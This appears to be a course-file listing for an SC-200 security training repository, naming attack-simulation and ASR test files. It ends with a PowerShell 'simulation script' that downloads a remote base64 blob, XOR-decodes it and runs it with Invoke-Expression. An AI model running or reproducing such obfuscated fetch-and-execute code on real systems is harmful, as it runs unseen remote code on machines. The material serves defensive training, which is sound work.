# CourseFiles for SC200

## SC200-Files1

- RS4_WinATP-Intro-Invoice.docm
- BloodHound.ps1
- FilelessATK.ps1
- RS3_WinATP-Intro-Invoice.docm

## SC200-Files2

- SC200-Files2\ASR_CFA_CleanupScript.zip
- SC200-Files2\ASR_SetupScript.zip
- Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm
- ransomware_cleanup_encrypt_decrypt.exe
- ransomware_testfile_doc.docm
- TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm
- TestFile_Impede_JavaScript_and_VBScript_to_launch_executables_D3E037E1-3EB8-44C8-A917-57927947596D.js
- TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm
- TestFile_PsexecAndWMICreateProcess_D1E49AAC-8F56-4280-B9BA-993A6D77406C.vbs
- UNSIGNED_ransomware_test_exe.exe

## Web-Links, Blogs und mehr
[hier](/WebLinks.md)

## Cross Product Simulation Script

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$base64String =	(Invoke-WebRequest -URI	https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt -UseBasicParsing).Content;
Try{ 
    $contentBytes =	[System.Convert]::FromBase64String($base64String) 
} 
Catch { 
    $contentBytes =	[System.Convert]::FromBase64String($base64String.Substring(3)) 
};

$i = 0;	
$decryptedBytes = @();
$contentBytes.foreach{ 
    $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {
        $i = 0
        }
    };
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
